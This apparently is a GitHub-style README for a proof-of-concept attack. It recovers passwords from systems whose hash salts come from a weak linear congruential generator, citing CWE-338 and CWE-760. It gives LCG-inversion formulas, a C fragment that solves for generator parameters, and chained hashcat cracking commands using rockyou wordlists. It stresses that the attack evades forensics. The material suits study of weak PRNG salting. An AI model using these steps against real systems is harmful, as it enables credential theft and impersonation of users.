# Salt-Hash Approximation Recovery-attack with Known plaintext using password backups (Hashcat)
> :warning: **Disclaimer**: THE INFORMATION PRESENTED IS FOR EDUCATIONAL PURPOSES ONLY.

This is a demonstrative recovery attack with which any low privilege user of the system
can potentially steal user credentials and perform actions using a different identity,
this works by exploiting the password reset feature shortly after a finished update cycle
in combination with backups for the attacker to map possible prng sequences to salts for hash predictions,
the attack does not set off any data integrity measures, cyber forensics would only notice traces of the attack once
the attacker is already using compromised credentials, making it hard if not impossible to identify the source.

## Summary
  1. Remove nearby hash salts by iteration of lcg parameters with known points in sequence
  2. Fire and forget guessed unsalted hashes based on lcg sequence via cloud compute services
  3. Copyright

### CWE-338 Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
Uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.
![](https://chart.apis.google.com/chart?cht=tx&chl=f(x_{n+1})=(ax_n+c)\gg%20d%20\pmod%20m%20\Rightarrow%20f^{-1}(y_n)=a^{-1}(y_n-c)\gg%20d%20\pmod%20m)
![](https://chart.apis.google.com/chart?cht=tx&chl=y_n:=\left%20\lfloor%20x_n/2^{31}%20\right%20\rfloor%20\pmod%20m)

```c
//for d=1
rlcg<a, c, m, /*second modulo*/0> rlcg({p1, p2});
if(!rlcg.solution().empty())
  std::cout << rlcg.solution() << std::endl;
```

### CWE-760 Use of a One-Way Hash with a Predictable Salt
One-way cryptographic hash against an input that should not be reversible, such as a password, but uses a predictable salt as part of the input.
![](https://chart.apis.google.com/chart?cht=tx&chl=h%3A%3Dmd5%28%5C%24pass%29%2B%5C%24salt.prng%5CRightarrow%20md5%3Dh-%5C%24salt.prng)

```
hashcat.exe -m 0 ./md5_salt_guess.hash -a 0 -d 1 ./rockyou-extended.dict & hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "!$??" ./rockyou-extended.dict ?1 &^
hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "@#%&*" ./rockyou-extended.dict ?1 & hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "12347890" -2 "!$??" ./rockyou-extended.dict ?1?2 &^
hashcat.exe -m 0 ./md5_salt_guess.hash -a 6 -d 1 -1 "12347890" ./rockyou-extended.dict ?1 & more hashcat.potfile
```

### Copyright and license
Code and documentation copyright 2021 Alexander Töpfer. Code released under the MIT License
